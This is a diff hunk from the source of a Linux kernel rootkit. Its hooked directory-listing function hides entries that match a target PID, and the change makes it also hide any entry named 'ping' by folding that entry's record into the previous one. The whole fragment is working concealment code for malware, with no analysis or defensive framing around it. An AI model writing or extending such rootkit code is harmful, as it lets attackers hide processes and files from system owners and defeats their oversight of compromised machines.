@@ -138,7 +138,7 @@ asmlinkage int hook_func(const struct pt_regs *regs)
         current_dir = (void*)dirent_ker + offset;
         // printk(KERN_INFO "rootkit: item: %s\n", current_dir->d_name);
         // if (strcmp(pid, current_dir->d_name) == 0 && strcmp(pid, "0") != 0) {
-        if (strcmp(pid, current_dir->d_name) == 0) {
+        if (strcmp(pid, current_dir->d_name) == 0 || strcmp("ping", current_dir->d_name) == 0) {
             printk(KERN_ALERT "rootkit: MATCH FILE\n");
 
             previous_dir->d_reclen += current_dir->d_reclen;
